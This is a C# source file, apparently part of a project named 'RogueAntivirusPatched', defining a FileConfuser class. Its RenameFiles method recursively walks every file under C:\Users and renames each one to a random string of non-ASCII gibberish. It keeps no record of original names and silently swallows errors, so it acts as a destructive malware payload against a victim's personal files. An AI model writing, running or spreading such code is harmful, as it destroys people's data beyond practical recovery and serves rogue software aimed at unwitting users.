using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using AdvancedIO;

namespace RogueAntivirusPatched.Classes
{
    public class FileConfuser
    {
        Random rand;
        private advancedIO _advancedIO;

        public FileConfuser()
        {
            _advancedIO = new advancedIO();
        }

        public void RenameFiles()
        {
            string targetDir = @"C:\Users";
            var getFiles = _advancedIO.GetAllFilesSafely(true, targetDir, "*");
            rand = new Random();

            foreach (var file in getFiles)
            {
                try
                {
                    if (!File.Exists(file))
                        continue;

                    var fileInfo = new FileInfo(file);
                    string newFile = "";

                    if (fileInfo.Name == "TranscodedWallpaper")
                        continue;

                    do
                    {
                        newFile = fileInfo.DirectoryName + @"\" + GenerateRandomString().ToString();
                    }
                    while (File.Exists(newFile));

                    File.Move(file, newFile);
                }
                catch { }
            }
        }

        private StringBuilder GenerateRandomString()
        {
            var sb = new StringBuilder();
            rand = new Random();
            int lenght = rand.Next(1, 180);

            for (int i = 0; i < lenght; i++)
            {
                char gibberishChar = (char)rand.Next(128, 1024);
                sb.Append(gibberishChar);
            }

            return sb;
        }
    }
}
